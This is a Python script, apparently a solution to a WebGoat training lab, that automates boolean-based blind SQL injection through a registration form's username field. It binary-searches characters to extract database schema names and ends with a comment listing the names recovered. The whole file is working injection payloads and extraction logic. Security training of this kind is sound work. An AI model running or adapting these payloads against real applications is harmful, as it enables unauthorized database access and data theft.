import requests
import string
from tqdm import tqdm

stringset = string.printable
ip = "192.168.1.95"
url = "http://" + ip + ":8888/WebGoat/SqlInjectionAdvanced/register"
cookies = {
    "JSESSIONID": "90F95A800366352F2648DA49D28D9B0C"
}

def send_payload(payload):
    data = {
        "username_reg": payload,
        "email_reg": "a@a.com",
        "password_reg": "a",
        "confirm_password_reg": "a"
    }
    res = requests.put(url, data=data, cookies=cookies)
    # print(res.text)
    # print("--------------------------------------------------------------------")
    return "already exists" in res.text.lower()

def get_db_count():
    for i in tqdm(range(1, 1000), desc="DB 개수 추측 중"):
        payload = f"' OR (SELECT COUNT(*) FROM information_schema.schemata) > {i} -- "
        if not send_payload(payload):
            print("\n-----------------------------------------------------------------------")
            print(f"[✓] DB 개수: {i}")
            return i
    return 0

def get_db_name_length(offset):
    for length in range(1, 100):
        payload = f"' OR LENGTH((SELECT schema_name FROM information_schema.schemata LIMIT {offset},1)) > {length} -- "
        if not send_payload(payload):
        	print("\n-----------------------------------------------------------------------")
        	print(f"[✓] DB #{offset} 이름 길이: {length}")
        	return length
    return 0

def get_db_name(offset, length):
    name = ""
    for i in tqdm(range(1, length + 1), desc=f"DB #{offset} 이름 추출 중"):
        low, high = 32, 126
        while low < high:
            mid = (low + high) // 2
            payload = f"' OR ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT {offset},1), {i}, 1)) > {mid} -- "
            if send_payload(payload):
                low = mid + 1
            else:
                high = mid
        name += chr(low)
        # print(f"    [+] 현재까지: {name}")
    print(f"[✓] DB #{offset} 이름: {name}")
    print("\n-----------------------------------------------------------------------")
    return name

db = []
count = get_db_count()
for i in range(count):
    length = get_db_name_length(i)
    if length > 0:
        db.append(get_db_name(i, length))

print("db: ",db)
'''
db: ['CONTAINER', 'INFORMATION_SCHEMA', 'PUBLIC', 'SYSTEM_LOBS', 'container', 'd3ng03']
'''